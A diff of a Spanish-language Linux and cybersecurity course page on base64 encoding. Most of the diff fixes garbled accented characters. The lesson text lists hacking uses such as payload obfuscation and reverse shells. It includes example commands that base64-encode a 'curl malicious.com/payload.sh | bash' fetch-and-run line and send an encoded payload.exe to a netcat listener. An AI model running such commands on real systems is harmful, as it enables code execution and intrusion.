@@ -1,9 +1,9 @@
-﻿<!doctype html>
+<!doctype html>
 <html lang="es">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>38. CodificaciÃ³n y decodificaciÃ³n en base64 | IntroducciÃ³n a Linux</title>
+    <title>38. Codificación y decodificación en base64 | Introducción a Linux</title>
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="../../css/styles.css" />
     <style>
@@ -138,28 +138,28 @@
       <ul class="nav-links">
         <li><a href="../../index.html">Cursos</a></li>
         <li><a href="#">Roadmap</a></li>
-        <li><a href="#">ConÃ³cenos</a></li>
+        <li><a href="#">Conócenos</a></li>
       </ul>
       <div class="nav-cta">
-        <button class="btn-ghost">Iniciar sesiÃ³n</button>
+        <button class="btn-ghost">Iniciar sesión</button>
         <button class="btn-accent">Registrarse</button>
       </div>
     </nav>
     <div style="background: var(--bg-deep); border-bottom: 1px solid var(--border);">
       <div class="breadcrumb">
-        <a href="../../index.html">Inicio</a><span>â€º</span>
-        <a href="../../index.html">Cursos</a><span>â€º</span>
-        <a href="../../index.html">IntroducciÃ³n a Linux</a><span>â€º</span>
+        <a href="../../index.html">Inicio</a><span>›</span>
+        <a href="../../index.html">Cursos</a><span>›</span>
+        <a href="../../index.html">Introducción a Linux</a><span>›</span>
         <span style="color: var(--text-2);">Clase 38</span>
       </div>
     </div>
     <div class="lesson-content">
-      <a href="../../index.html" class="back-link">â† Volver al curso</a>
-      <span class="course-tag">ðŸ§ Linux Â· Ciberseguridad</span>
-      <h1 class="course-title" style="margin-bottom: 0.5rem;">CodificaciÃ³n y decodificaciÃ³n en base64</h1>
-      <div style="color: var(--text-3); font-size: 0.85rem; margin-bottom: 2rem;">DuraciÃ³n: 3:42 Â· SecciÃ³n 2: Temario</div>
+      <a href="../../index.html" class="back-link">← Volver al curso</a>
+      <span class="course-tag">🐧 Linux · Ciberseguridad</span>
+      <h1 class="course-title" style="margin-bottom: 0.5rem;">Codificación y decodificación en base64</h1>
+      <div style="color: var(--text-3); font-size: 0.85rem; margin-bottom: 2rem;">Duración: 3:42 · Sección 2: Temario</div>
 
-      <p>Base64 es un sistema de codificaciÃ³n que convierte datos binarios en texto ASCII usando 64 caracteres (A-Z, a-z, 0-9, +, /). Es ubicuo en la web moderna: emails (MIME), autenticaciÃ³n HTTP, JWT, y ofuscaciÃ³n en malware.</p>
+      <p>Base64 es un sistema de codificación que convierte datos binarios en texto ASCII usando 64 caracteres (A-Z, a-z, 0-9, +, /). Es ubicuo en la web moderna: emails (MIME), autenticación HTTP, JWT, y ofuscación en malware.</p>
 
       <h2>Codificar y decodificar con base64</h2>
       <p>En Linux, el comando <code>base64</code> hace ambas operaciones de forma directa.</p>
@@ -178,21 +178,21 @@ base64 imagen.png > imagen.b64
 base64 -d imagen.b64 > imagen_recuperada.png</code></pre>
 
       <div class="highlight">
-        <strong>ðŸ§  Â¿Por quÃ© "base64"?</strong> Porque usa 2â¶ = 64 caracteres. Cada carÃ¡cter representa 6 bits. Para codificar 3 bytes (24 bits) se necesitan 4 caracteres base64 (4 Ã— 6 = 24 bits). Si los datos no son mÃºltiplo de 3, se aÃ±ade padding con <code>=</code>.
+        <strong>🧠 ¿Por qué "base64"?</strong> Porque usa 2⁶ = 64 caracteres. Cada carácter representa 6 bits. Para codificar 3 bytes (24 bits) se necesitan 4 caracteres base64 (4 × 6 = 24 bits). Si los datos no son múltiplo de 3, se añade padding con <code>=</code>.
       </div>
 
       <h2>Comparativa: base64 vs base32 vs hex</h2>
       <table>
         <tr>
-          <th>CodificaciÃ³n</th>
+          <th>Codificación</th>
           <th>Alfabeto</th>
           <th>Eficiencia</th>
-          <th>Uso tÃ­pico</th>
+          <th>Uso típico</th>
         </tr>
         <tr>
           <td>base64</td>
           <td>A-Z a-z 0-9 + /</td>
-          <td>75% (3 bytes â†’ 4 chars)</td>
+          <td>75% (3 bytes → 4 chars)</td>
           <td>Web, JWT, MIME</td>
         </tr>
         <tr>
@@ -204,7 +204,7 @@ base64 -d imagen.b64 > imagen_recuperada.png</code></pre>
         <tr>
           <td>hex (base16)</td>
           <td>0-9 a-f</td>
-          <td>50% (1 byte â†’ 2 chars)</td>
+          <td>50% (1 byte → 2 chars)</td>
           <td>Hashing, debugging</td>
         </tr>
       </table>
@@ -221,9 +221,9 @@ echo "4861636b3475" | xxd -r -p</code></pre>
       <h2>Aplicaciones en hacking</h2>
       <p>Base64 se usa frecuentemente en ciberseguridad para:</p>
       <ul>
-        <li><strong>OfuscaciÃ³n de payloads:</strong> Malware que codifica sus cadenas en base64 para evadir detecciÃ³n estÃ¡tica</li>
+        <li><strong>Ofuscación de payloads:</strong> Malware que codifica sus cadenas en base64 para evadir detección estática</li>
         <li><strong>Transferencia de binarios:</strong> Pasar un binario por un canal que solo soporta texto (HTTP, DNS)</li>
-        <li><strong>Reverse shell:</strong> Codificar comandos para evasiÃ³n</li>
+        <li><strong>Reverse shell:</strong> Codificar comandos para evasión</li>
         <li><strong>JWT:</strong> Los tokens JWT usan base64 URL-safe (reemplaza +/ por -_)</li>
       </ul>
 
@@ -237,23 +237,23 @@ echo "curl http://malicious.com/payload.sh | bash" | base64
 base64 -w0 payload.exe | nc 192.168.1.10 4444</code></pre>
 
       <div class="warning">
-        <strong>âš ï¸ Importante:</strong> base64 <strong>no es cifrado</strong>. Cualquiera puede decodificarlo instantÃ¡neamente. Es codificaciÃ³n, no encriptaciÃ³n. No lo uses para proteger datos sensibles.
+        <strong>⚠️ Importante:</strong> base64 <strong>no es cifrado</strong>. Cualquiera puede decodificarlo instantáneamente. Es codificación, no encriptación. No lo uses para proteger datos sensibles.
       </div>
 
       <div class="lesson-nav">
-        <a href="clase-37.html">â† Anterior: InterpretaciÃ³n de archivos binarios</a>
-        <a href="clase-39.html">Siguiente: Cifrado CÃ©sar y uso de tr â†’</a>
+        <a href="clase-37.html">← Anterior: Interpretación de archivos binarios</a>
+        <a href="clase-39.html">Siguiente: Cifrado César y uso de tr →</a>
       </div>
     </div>
     <footer>
       <div class="footer-logo">hack4u</div>
       <div class="footer-links">
         <a href="#">Aviso Legal</a>
-        <a href="#">PolÃ­tica de Cookies</a>
+        <a href="#">Política de Cookies</a>
         <a href="#">Privacidad</a>
-        <a href="#">TÃ©rminos y Condiciones</a>
+        <a href="#">Términos y Condiciones</a>
       </div>
-      <div>Â© 2026 hack4u.io â€” Todos los derechos reservados.</div>
+      <div>© 2026 hack4u.io — Todos los derechos reservados.</div>
     </footer>
   </body>
 </html>
